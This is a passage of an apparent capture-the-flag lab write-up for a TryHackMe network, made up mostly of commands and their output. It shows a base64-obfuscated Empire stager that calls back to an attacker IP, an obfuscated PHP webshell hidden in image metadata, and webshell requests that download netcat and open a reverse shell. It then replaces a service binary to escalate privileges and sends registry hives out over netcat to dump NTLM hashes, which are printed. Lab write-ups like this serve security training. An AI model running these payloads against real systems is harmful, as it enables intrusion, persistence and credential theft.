[*] Loading listeners from: /usr/share/powershell-empire/empire/server/listeners/
[*] Loading malleable profiles from: /usr/share/powershell-empire/empire/server/data/profiles
[*] Searching for plugins at /usr/share/powershell-empire/empire/server/plugins
[*] Plugin csharpserver found.
[*] Initializing plugin...
[*] Doing custom initialization...
[*] Loading Empire C# server plugin
[*] Registering plugin with menu...
[*] Empire starting up...
[*] Starting Empire RESTful API on 0.0.0.0:1337
[*] Starting Empire SocketIO on 0.0.0.0:5000
[*] Testing APIs
[+] Empire RESTful API successfully started
[+] Empire SocketIO successfully started
[*] Cleaning up test user
Server >
```

`powershell-empire client`

```
========================================================================================
 [Empire] Post-Exploitation Framework
========================================================================================
 [Version] 4.1.3 BC Security Fork | [Web] https://github.com/BC-SECURITY/Empire
========================================================================================
 [Starkiller] Multi-User GUI | [Web] https://github.com/BC-SECURITY/Starkiller
========================================================================================
 This build was released exclusively for Kali Linux | https://kali.org
========================================================================================

   _______   ___  ___   ______    __   ______        _______
  |   ____| |   \/   | |   _  \  |  | |   _  \      |   ____|
  |  |__    |  \  /  | |  |_)  | |  | |  |_)  |     |  |__
  |   __|   |  |\/|  | |   ___/  |  | |      /      |   __|
  |  |____  |  |  |  | |  |      |  | |  |\  \----. |  |____
  |_______| |__|  |__| | _|      |__| | _| `._____| |_______|


       393 modules currently loaded

       0 listeners currently active

       0 agents currently active

[*] Connected to localhost
(Empire) >


```

alternativelly to client we can use `starkiller` command for electron GUI to the server

Generated `Stagger`

```
#!/bin/bash

echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpCm91dCwgZXJyID0gcHMuY29tbXVuaWNhdGUoKQppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliLnJlcXVlc3Q7ClVBPSdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbyc7c2VydmVyPSdodHRwOi8vMTAuNTAuMTgyLjY6OTAwMCc7dD0nL25ld3MucGhwJztyZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdChzZXJ2ZXIrdCk7CnByb3h5ID0gdXJsbGliLnJlcXVlc3QuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIucmVxdWVzdC5idWlsZF9vcGVuZXIocHJveHkpOwpvLmFkZGhlYWRlcnM9WygnVXNlci1BZ2VudCcsVUEpLCAoIkNvb2tpZSIsICJzZXNzaW9uPVppNHdDeWFLKzJmS3ppaDR4YkZjOWhIZjgvbz0iKV07CnVybGxpYi5yZXF1ZXN0Lmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCk7CklWPWFbMDo0XTtkYXRhPWFbNDpdO2tleT1JVisnNUh8UHEhWys2NHtEJSo9NzIxX2NHVUZOWG15bz5sSTAnLmVuY29kZSgnVVRGLTgnKTtTLGosb3V0PWxpc3QocmFuZ2UoMjU2KSksMCxbXQpmb3IgaSBpbiBsaXN0KHJhbmdlKDI1NikpOgogICAgaj0oaitTW2ldK2tleVtpJWxlbihrZXkpXSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKGNoYXJeU1soU1tpXStTW2pdKSUyNTZdKSkKZXhlYygnJy5qb2luKG91dCkp'));" | python3 &

rm -f "$0"
exit
```

```
[root@prod-serv hop-nairolf]# curl 10.50.182.6:4444/hop.zip -o /tmp/hop-nairolf/hop.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2985  100  2985    0     0  10187      0 --:--:-- --:--:-- --:--:-- 10187


[root@prod-serv hop-nairolf]# php -S 0.0.0.0:47000 &>/dev/null &
[1] 2285

[root@prod-serv hop-nairolf]# firewall-cmd --zone=public --add-port 47000/tcp
success
[root@prod-serv hop-nairolf]# firewall-cmd --zone=public --add-port 47002/tcp
success


```

## Personnal PC

### Enumeration

```
*Evil-WinRM* PS C:\Users\nairolf\Documents> upload /home/nair0lf/Desktop/THM/Wreath/www/nc-nairolf c:\windows\temp\nc.exe
Info: Uploading /home/nairolf/Desktop/THM/Wreath/www/nc-nairolf to c:\windows\temp\nc.exe


Data: 3885896 bytes of 3885896 bytes copied

Info: Upload successful!
```

```
└──╼ $evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1  -i 10.200.185.150 -s www

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan.ps1
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-Help Invoke-Portscan

NAME
    Invoke-Portscan

SYNOPSIS
    Simple portscan module

    PowerSploit Function: Invoke-Portscan
    Author: Rich Lundeen (http://webstersProdigy.net)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

...
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.185.100 -TopPorts 50


Hostname      : 10.200.185.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 110, 21...}
finishTime    : 11/29/2021 12:14:19 PM

```

### Pivoting

We choose `chisel`

first we open our port in windows

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> netsh advfirewall firewall add rule name="Chisel-nairolf" dir=in action=allow protocol=tcp localport=32000

Ok.


*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /home/nair0lf32/Desktop/Stuff/THM/Wreath/www/chisel-nairolf.exe C:\Users\Administrator\Documents\chisel-nairolf.exe
Info: Uploading /home/nair0lf32/Desktop/Stuff/THM/Wreath/www/chisel-nairolf.exe to C:\Users\Administrator\Documents\chisel-nairolf.exe


Data: 11758248 bytes of 11758248 bytes copied

Info: Upload successful!


*Evil-WinRM* PS C:\Users\Administrator\Documents> ./chisel-nairolf.exe server -p 44444 --socks5
chisel-nairolf.exe : 2021/11/29 14:15:21 server: Fingerprint IctmjgRClxQsS3GsVO0UqEy60igyHMZsncWLY80tTqc=
    + CategoryInfo          : NotSpecified: (2021/11/29 14:1...MZsncWLY80tTqc=:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2021/11/29 14:15:21 server: Listening on http://0.0.0.0:44444



```

Then on our side we set the proxy on port 9000

```
└──╼ $./chisel_linux client 10.200.185.150:44444  9000:socks
2021/11/29 15:17:46 client: Connecting to ws://10.200.185.150:44444
2021/11/29 15:17:46 client: tun: proxy#127.0.0.1:9000=>socks: Listening

```

we configure foxyroxy for 127.0.0.1:9000 and access the website

DONT FORGET PROXY TYPE: SOCK5

wappalyzer say it's `php 7.4.11`

### the wonders of git

in evil-winrm navigate to `C:\GitStack\repositories\Website.git` and download it

```
*Evil-WinRM* PS C:\GitStack\repositories> download C:\GitStack\repositories\Website.git /home/somenibba/THM/Wreath/
Info: Downloading C:\GitStack\repositories\Website.git to /home/nair0lf32/Desktop/Stuff/THM/Wreath/


Info: Download successful!
```

Recreate the `.git` repo and anlayze with `gittools extractor`

```
GitTools-master/Extractor/extractor.sh . Website
```

```
└──╼ $git log
commit 345ac8b236064b431fa43f53d91c98c4834ef8f3 (HEAD -> master)
Author: twreath <me@thomaswreath.thm>
Date:   Sat Jan 2 19:05:15 2021 +0000

    Updated the filter

commit 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
Author: twreath <me@thomaswreath.thm>
Date:   Mon Dec 21 23:12:31 2020 +0000

    Initial Commit for the back-end

commit 70dde80cc19ec76704567996738894828f4ee895
Author: twreath <me@thomaswreath.thm>
Date:   Sun Nov 8 15:30:58 2020 +0000

    Static Website Commit
```

Now we access `/ressources` dir on machine 3 website with creds `Thomas : i<3ruby`

Prepare exploit

```
└──╼ $exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-nairolf.jpg.php
    1 image files updated

upload and visit `http://10.200.185.100/resources/uploads/test-nairolf.jpg.php`

����JFIF��1

Test Payload

```

## AV Evasion

Inject obfuscated php in shell image

```
└──╼ $exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-nairolf.jpg.php
    1 image files updated

```

Now we have a webshell with `wreath` parameter for commands

`http://10.200.185.100/resources/uploads/shell-nairolf.jpg.php?wreath=whoami`

```
wreath-pc\thomas

```

`hostanme`

```
wreath-pc
```

`certutil.exe`

```
CertUtil: -dump command completed successfully.
```

Upload netcat and listen on your side

```
http://10.200.185.100/resources/uploads/shell-nairolf.jpg.php?wreath=curl%20http://10.50.182.6/nc-nairolf.exe%20-o%20c:\\windows\\temp\\nc-nairolf.exe
```

And fire it up for a shell

```
10.200.185.100/resources/uploads/shell-nairolf.jpg.php?wreath=powershell.exe c:\\windows\\temp\\nc-nairolf.exe 10.50.182.6 4444 -e cmd.exe
```

### enumeration

```
C:\xampp\htdocs\resources\uploads>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


C:\xampp\htdocs\resources\uploads>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


```

Now check for non-default service

```
C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
DisplayName                                                                         Name                                      PathName                                                                                    StartMode
Amazon SSM Agent                                                                    AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                          Auto
Apache2.4                                                                           Apache2.4                                 "C:\xampp\apache\bin\httpd.exe" -k runservice                                               Auto
AWS Lite Guest Agent                                                                AWSLiteAgent                              "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                            Auto
LSM                                                                                 LSM                                                                                                                                   Unknown
Mozilla Maintenance Service                                                         MozillaMaintenance                        "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                 Manual
NetSetupSvc                                                                         NetSetupSvc                                                                                                                           Unknown
Windows Defender Advanced Threat Protection Service                                 Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                  Manual
System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto
Windows Defender Antivirus Network Inspection Service                               WdNisSvc                                  "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\NisSrv.exe"               Manual
Windows Defender Antivirus Service                                                  WinDefend                                 "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\MsMpEng.exe"              Auto
Windows Media Player Network Sharing Service                                        WMPNetworkSvc                             "C:\Program Files\Windows Media Player\wmpnetwk.exe"
```

```
C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
sc qc SystemExplorerHelpService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Check directory permissions

```
C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
Owner  : BUILTIN\Administrators
Group  : WREATH-PC\None
Access : BUILTIN\Users Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  :
Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-341852264
         9-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-22714784
         64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
         BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
         ;;S-1-15-2-2)

```

### privilege escalation

compile `Wrapper.cs` with `mcs Wrapper.cs`

upload using any way recommanded and start a listenner

simple curl is `curl http://10.50.182.6/Wrapper.exe -o %temp%\wrapper-nairolf.exe`

But try impacket smb method too

then `%TEMP%\Wrapper-nairolf.exe`

```
C:\xampp\htdocs\resources\uploads>whoami
whoami
wreath-pc\thomas
```

Copy the exploit to the right service folder

```
C:\xampp\htdocs\resources\uploads>copy %temp%\wrapper-nairolf.exe "C:\Program Files (x86)\System Explorer\System.exe"

copy %temp%\wrapper-nairolf.exe "C:\Program Files (x86)\System Explorer\System.exe"
        1 file(s) copied.
```

Stop the service

```
sc stop SystemExplorerHelpService

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x1388
```

set another listner on same port and restart the service

```
C:\xampp\htdocs\resources\uploads>sc start SystemExplorerHelpService
sc start SystemExplorerHelpService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

Get root on your listenner

```
C:\Windows\system32>whoami
whoami
nt authority\system
```

## Exfiltration

Now we will use the impacket smb tecnique

Dump the files

```
C:\Windows\System32>reg.exe save HKLM\SAM sam.bak
reg.exe save HKLM\SAM sam.bak
The operation completed successfully.

C:\Windows\System32>reg.exe save HKLM\SYSTEM system.bak
reg.exe save HKLM\SYSTEM system.bak
The operation completed successfully.
```

We start the server on our side

```
└──╼ $sudo python /home/nair0lf32/Desktop/t00lB0x/Exploitation/impacket-master/examples/smbserver.py share . -smb2support -username nairolf -password nairolf
[sudo] Mot de passe de nair0lf32 :
Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

connect the machine

```
C:\Windows\system32>net use \\10.50.182.6\share /USER:nairolf nairolfpass
net use \\10.50.182.6\share /USER:nairolf nairolf

```

I had an issue here

```
System error 53 has occurred.

The network path was not found.
```

Restarted network but still

```
C:\Windows\System32> net use * /d /y
 net use * /d /y
There are no entries in the list.
```

I decided to use a workaround with the netcat i uploaded earlier

```
nc-nairolf.exe 10.50.182.6 4444 < C:\Windows\System32\sam.bak

└──╼ $nc -lnvp 4444 > sam.bak
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 49923



nc-nairolf.exe 10.50.182.6 4444 < C:\Windows\System32\system.bak


└──╼ $nc -lnvp 4444 > system.bak
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 49977
```

Then I could proceed to extracting hashes

```
└──╼ $sudo python /home/nair0lf32/Desktop/t00lB0x/Exploitation/impacket-master/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
[sudo] Mot de passe de nair0lf32 :
Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up...
```

This room was a bit tedious but great knoweledge was acquired!

It took some time, but that great journey was just paving the way toward greater adventures in the networking field

keep making cisco proud

thanks MuirlandOracle
